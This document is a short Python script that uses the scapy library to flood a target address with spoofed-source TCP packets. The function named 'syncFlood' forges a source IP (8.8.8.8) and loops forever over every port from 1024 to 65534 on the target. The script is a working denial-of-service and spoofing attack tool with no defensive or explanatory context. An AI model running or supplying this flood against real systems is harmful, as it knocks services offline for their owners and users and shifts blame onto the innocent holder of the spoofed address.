#!/usr/bin/python

from scapy.all import *

def syncFlood(src,tgt,message):
	for dport in range(1024,65535):
		IPLayer=IP(src=src,dst=tgt)
		TCPlayer=TCP(sport=4444,dport=dport)
		RawLayer=Raw(load=message)
		pkt=IPLayer/TCPlayer/RawLayer
		send(pkt)

source="8.8.8.8" #raw_input("[*] Enetr Source IP to fake:")
target="192.168.1.1" #raw_input("[*] Enter Target IP Address:")
message="Hello World" #raw_input("[*] Enter message for TCP Payload:")

while True:
	syncFlood(source,target,message)
